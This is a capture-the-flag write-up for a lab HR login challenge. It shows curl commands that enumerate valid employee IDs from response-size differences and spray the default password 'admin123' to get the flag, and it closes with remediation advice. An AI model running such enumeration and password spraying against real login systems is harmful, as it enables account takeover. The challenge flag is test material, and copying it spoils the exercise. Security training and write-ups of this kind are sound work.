# PeopleFirst_HR - username enumeration + unchanged default password

| | |
|---|---|
| **Challenge** | PeopleFirst_HR |
| **Category** | AUTH |
| **Points / Difficulty** | 100 / easy |
| **Target** | http://auth10.chal.deti:8069 |
| **Auth weakness** | CWE-204 - observable response discrepancy (username enumeration) + default password |

## Hint
> Wrong name gets a "no." Right name just needs the one password no one changed.

## Recon
- Login form at **`/login`**: `POST`, fields **`emp_id`** and `password`.
- A "Meet the team" page lists staff and the **ID scheme**: *first initial +
  last name, lowercase*. So:
  - `pnatarajan` - Priya Natarajan, **HR Systems Administrator** (the target)
  - `mebo` - Marcus Ebo · `lford` - Lena Ford
- (Early attempts failed because the field is `emp_id`, not `username` - a
  missing field just re-renders the 1105-byte form.)

## Approach
**CWE-204:** the login returns a slightly different response for a valid vs
invalid account, so you can confirm which IDs exist:

| emp_id | response size |
|--------|---------------|
| `zzzznope` (invalid) | **1105** ("no such user") |
| `pnatarajan` / `mebo` / `lford` (valid) | **1104** ("wrong password") |

Having confirmed `pnatarajan` is real, spray the "initial password nobody
changed." It turned out to be **`admin123`**.

## Exploitation - the exact requests
```bash
# 1. enumerate: valid IDs return 1104, invalid 1105
for u in zzzznope pnatarajan mebo lford; do
  echo "$(curl -s -o /dev/null -w '%{size_download}' -d "emp_id=$u&password=x" \
        http://auth10.chal.deti:8069/login)  $u"
done

# 2. default-password spray on the admin -> admin123 succeeds
curl -s -d 'emp_id=pnatarajan&password=admin123' \
     http://auth10.chal.deti:8069/login | grep -o 'flag{[^}]*}'
```

## Flag
```
flag{387b76ed04da94cfb63cd7b0172fdaba}
```

## Root cause & remediation
- **Cause:** (1) the login distinguishes "no such user" from "wrong password"
  (CWE-204), enabling account enumeration, aided by a published username
  scheme; (2) the admin account keeps a weak default password (`admin123`) that
  was never rotated.
- **Fix:** return a single generic "invalid credentials" message (identical
  body/size/timing) for both failure modes; force a password change on first
  login and ban default/weak passwords; add rate-limiting / lockout to blunt
  spraying.
